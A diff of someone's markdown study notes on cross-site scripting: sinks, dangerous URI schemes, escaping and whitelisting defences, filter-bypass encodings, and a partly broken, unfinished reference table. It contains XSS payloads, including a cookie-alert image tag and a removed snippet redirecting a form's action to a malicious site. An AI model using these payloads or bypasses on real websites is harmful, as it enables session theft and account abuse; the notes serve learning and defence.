@@ -36,6 +36,7 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 - non-HTML-based sinks? Like setTimeout. What does that mean?
 - Content security policy to prevent XSS?
 - Dangling markup injections?
+- Why double url encode?
 
 - Todo
 	- HTML encoding(Ex: change `<`s to `&lt;`) vs HTML sanitization(Allowing some html elements, but not all)
@@ -45,9 +46,10 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 - [Cross Site ScriptingXSS](#cross-site-scriptingxss)
 	- [URL parameter XSS](#url-parameter-xss)
 	- [Common payloads](#common-payloads)
-	- [Sinks - Where user input is used](#sinks---where-user-input-is-used)
-		- [Inside html attributes](#inside-html-attributes)
+	- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
 		- [Inside html entities](#inside-html-entities)
+		- [Inside html attributes](#inside-html-attributes)
+			- [Uniform Resource IdentifierURIs](#uniform-resource-identifieruris)
 		- [Inside Javascript](#inside-javascript)
 		- [Inside CSS](#inside-css)
 	- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
@@ -56,11 +58,55 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 		- [What information to steal](#what-information-to-steal)
 		- [Manipulating actions](#manipulating-actions)
 	- [Prevent XSS attacks](#prevent-xss-attacks)
+	- [Reference table](#reference-table)
 	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
 	- [Checklist](#checklist)
 	- [Javascript special strings syntax](#javascript-special-strings-syntax)
 
 <!-- /TOC -->
+
+--------------------------------------------------------------------------------
+- Define XSS
+	- URL parameter based
+	- Database based
+
+- URL parameter based XSS
+
+- Common payloads
+
+- Different types Sinks
+	- HTML elements
+	- HTML attributes
+	- Javascript
+		- innerHTML
+	- CSS
+
+- Easy ways to prevent XSS
+	- Don't use URL params
+	- Follow the common prevention techniques for the different sinks
+	- Content Security Policy(CSPs)
+		- Sent by server in the header in every response
+		- Allows us to specigy exactly what sources are trusted and disable any inline resources
+
+- Bypassing common XSS filters
+	- Trying the same character multiple times(replace vs replaceAll)
+	- Avoiding commonly used XSS attacks
+		- Try something other than
+			- `alert()`
+			- `<script>`
+			- `javascript:`
+
+- Weaponizing XSS
+
+- HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)
+
+- File upload vulnerabilities
+	- SVGs
+	- PDFs
+
+- Reference table
+
+--------------------------------------------------------------------------------
 
 # Cross Site Scripting(XSS)
 Cross site scripting(XSS) allows an attacker to get a victim to run malicious code on their browser while looking like it came from a legitimate source.
@@ -102,21 +148,48 @@ Possible html output
 - `prompt()`
 - `console.log()`
 
-## Sinks - Where user input is used
-
-### Inside html attributes
-- Ex: `<a src={user input}>Link</a>`
-	- Wait for elements to load: `<script>window.onload=function(){`
-		- Making a comment: `document.getElementByName('comment')[0].innerHTML='Comment';document.getElementById('theform').submit();`
-		- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
-	- `}</script>`
-	- Have to escape the `"`
-	- `javascript:print()`
+## Different types of Sinks - Where user input is used
 
 ### Inside html entities
-- Ex: `<p>{user input}</p>`
+- Ex: `<p>{userInput}</p>`
 
-	- No escape needed
+In order to prevent this the server should filter out any `<`s
+- Ex: `userInput = userInput.replaceAll("<", "&lt;")`
+- This works because no html entity can start without a `<`
+
+### Inside html attributes
+- Ex: `<a src="{user input}">Link</a>`
+- Ex2: `<input value="{user input}">`
+
+In order to prevent this the server should filter out any `<`s and `"`s as well as have a whitelist of URIs
+- Ex: `userInput = userInput.replaceAll("<", "&lt;").replaceAll('"', "&quot;")`
+- This works because no html entity can start without a `<`
+
+#### Uniform Resource Identifier(URIs)
+- URIs are often used for attributes which can access the internet
+	- `src`, `href`, `action`, `data`, `formaction`, `poster`, `manifest`, `ping`, `cite`, `usemap`
+- `javascript:print()`
+- Doesn't work on modern browsers
+	- `data:[<mediatype>][;base64],<data>`
+		- `data:image/svg+xml;utf8,<svg content>`
+		- `data:text/html;base64,PHNjcmlwdD5wcmludCgpPC9zY3JpcHQ+`
+		- `data:text/html,<script>print()</script>`
+	- `vbscript:MsgBox('XSS')` or `vbscript:msgbox('XSS')`
+	- `livescript:[code]`
+
+In order to prevent URI attacks there should be a whitelist of acceptable URIs and not a blacklist.
+- Why not use a Blacklist
+	- There are lots of non-standard URIs for different browser
+	- There could be more unsafe URIs in the future
+	- There can be unique ways of encoding URIs
+		- Ex: `jAvAsCrIpT:`, `javas%09cript:`,	`javas]]<![CDATA[cript:`
+			- `%09`, `%00`, `%20`, `%10`, `\0`
+- Common whitelist used by Wordpress
+	- `http`, `https`, `ftp`, `ftps`, `mailto`, `news`, `irc`, `gopher`, `nntp`, `feed`, `telnet`, `mms`, `rtsp`, `svn`, `tel`, `fax`, `xmpp`
+
+Js code for whitelist?
+- If it begins with a specific URI?
+	- Could you do `https://javascript:alert()`
 
 ### Inside Javascript
 - Ex:
@@ -132,6 +205,8 @@ const param2 = params.get('param2')
 	- `document.URL`, `document.documentURI`, `document.baseURI`
 	- Location(these are all the same obj): `window.location`, `document.location`, `location`
 	- JQuery: `.parseParams()`
+- Sinks
+	- innerHTML
 
 ### Inside CSS
 	- Not very common
@@ -193,10 +268,44 @@ document.addEventListener('keydown', (event) => {
 	- Can distinguish between legitimate inputs and injected JS code
 	- 
 
+Use `<input value="userInput">`
+
 which is an additional header in the server or specified in the html which only allows certain 
 	- This only limits what XSS can do. It might not prevent it.
 
 --------------------------------------------------------------------------------
+
+## Reference table
+
+| Symbol | HTML name | HTML code | HTML hex code |           | URL   | JS Unicode | JS Hex | JS Oct |
+|--------|-------------------|-------|------------|--------|--------|
+| `"`    | `&quot;` , `&#34` | `%22` |            |        |        |
+| `&`    | `&amp;`           | `%26` |            |        |        |
+
+| `%`    | `&
+| `'`    |
+
+" , `&lpar;`, `&rpar;`
+HTML hex code: `&#x6A`
+
+- Unicode(ASCII hex)
+	- `<`: `\u003C`
+- Hexadecimal
+	- `<`: `\x3c`
+- Octal
+	- `<`: `\074`
+
+| Filtered symbol | Try instead                                      |
+|-----------------|--------------------------------------------------|
+| `"`s or `'`s    | `&quot;`, `&lpar;` and `&rpar;`, `%27`, or `%22` |
+| `<`s            | `&lt;`, `%3C`, or `\x3c`                         |
+| `>`s            | `&gt;`, `%3E`, or `\x3e`                         |
+| `\`s            | `\\`                                             |
+| `(`s and `)`s   |                                                  |
+| `&`s            | `%26` , `&amp;`                                  |
+| `%`s            |                                                  |
+| `.`s            |                                                  |
+| `=`s            |                                                  |
 
 ## Bypassing common XSS filters
 - Filtering out tags
@@ -210,17 +319,6 @@ See [XXS Tests](./xss_tests.md)
 
 Often times inputs are filtered to remove or replace certain characters. This usually means that that input isn't susceptible to XSS attacks, however the filter might not be set up correctly.
 
-| Filtered symbol | Try instead                                      |
-|-----------------|--------------------------------------------------|
-| `"`s or `'`s    | `&quot;`, `&lpar;` and `&rpar;`, `%27`, or `%22` |
-| `<`s            | `&lt;`, `%3C`, or `\x3c`                         |
-| `>`s            | `&gt;`, `%3E`, or `\x3e`                         |
-| `\`s            | `\\`                                             |
-| `(`s and `)`s   |                                                  |
-| `&`s            | `%26` , `&amp;`                                  |
-| `%`s            |                                                  |
-| `.`s            |                                                  |
-| `=`s            |                                                  |
 
 Sometimes you need to add `">` or `'>` in front of your attacks as an escape sequence.
 
@@ -244,9 +342,3 @@ Stored XSS:
 3. 2nd account checks the post to see if it runs.
 
 ## Javascript special strings syntax
-- Unicode(ASCII hex)
-	- `<`: `\u003C`
-- Hexadecimal
-	- `<`: `\x3c`
-- Octal
-	- `<`: `\074`
